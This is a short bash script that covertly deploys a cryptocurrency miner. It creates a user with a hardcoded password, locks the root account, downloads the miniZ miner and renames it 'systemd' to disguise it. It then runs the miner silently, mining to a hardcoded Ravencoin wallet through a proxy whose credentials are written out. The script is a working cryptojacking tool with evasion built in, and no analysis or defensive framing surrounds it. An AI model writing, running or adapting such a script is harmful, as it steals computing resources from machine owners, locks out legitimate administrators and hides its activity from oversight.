#!/bin/bash

# Define variables
new_username="isolated_user"
password="isolate123"
original_command="./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns"

# Check if user exists
if id "$new_username" &>/dev/null; then
    echo "User $new_username already exists."
else
    # Create user account
    sudo useradd -m -s /bin/bash -U "$new_username"

    # Set user password
    echo "$new_username:$password" | sudo chpasswd

    # Add user to docker group
    sudo usermod -aG docker "$new_username"

    # Add subuids for user
    sudo usermod --add-subuids 10-20000 "$new_username"

    # Lock the user's password to prevent login
    sudo passwd -l "$new_username"
fi

# Lock root user
sudo usermod -L root

# Update and install Docker
sudo apt update && sudo apt install -y docker.io

# Download miniZ
wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz

# Extract miniZ
tar -xvf miniZ_v2.3c_linux-x64.tar.gz

# Move miniZ to systemd
mv miniZ systemd

# Execute the original command and suppress output
$original_command >/dev/null 2>&1
